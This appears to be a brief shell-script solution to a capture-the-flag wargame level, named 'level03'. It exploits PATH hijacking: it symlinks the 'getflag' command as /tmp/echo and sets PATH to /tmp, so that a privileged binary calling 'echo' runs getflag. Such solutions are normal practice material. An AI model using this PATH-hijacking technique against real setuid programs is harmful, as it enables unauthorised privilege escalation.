#!/bin/sh -eu

# Create a symbolic link named `echo` that points to the `getflag` command
ln -s $(which getflag) /tmp/echo

# Set the `/tmp` directory as the only one in the `PATH` environment variable
export PATH=/tmp

# Execute the `level03` file
~/level03

exit 0
